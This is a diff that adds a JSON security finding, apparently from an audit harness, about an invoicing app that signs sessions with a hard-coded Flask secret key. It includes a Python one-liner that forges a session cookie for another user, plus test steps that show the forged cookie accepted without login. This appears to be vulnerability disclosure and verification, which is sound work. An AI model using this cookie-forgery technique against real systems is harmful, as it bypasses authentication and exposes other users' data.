@@ -1,0 +1,6 @@
+{"finding": "F-1",
+ "description": "With no SECRET_KEY in the environment the app signs sessions with the key hard-coded at invoicer/__init__.py:11. A cookie for user_id 2 (bob), signed with that key, is accepted without logging in. Generate it with: python -c \"from flask import Flask; from flask.sessions import SecureCookieSessionInterface as S; a = Flask('x'); a.secret_key = '<value at invoicer/__init__.py:11>'; print(S().get_signing_serializer(a).dumps({'user_id': 2}))\" and export it as FORGED_SESSION.",
+ "steps": [
+   {"name": "no session", "method": "GET", "path": "/invoices", "expect_status": 401},
+   {"name": "forged session", "method": "GET", "path": "/invoices", "cookies": {"session": "{env:FORGED_SESSION}"}}],
+ "proof": {"type": "marker_in_response", "step": "forged session", "marker": "INV-2002"}}
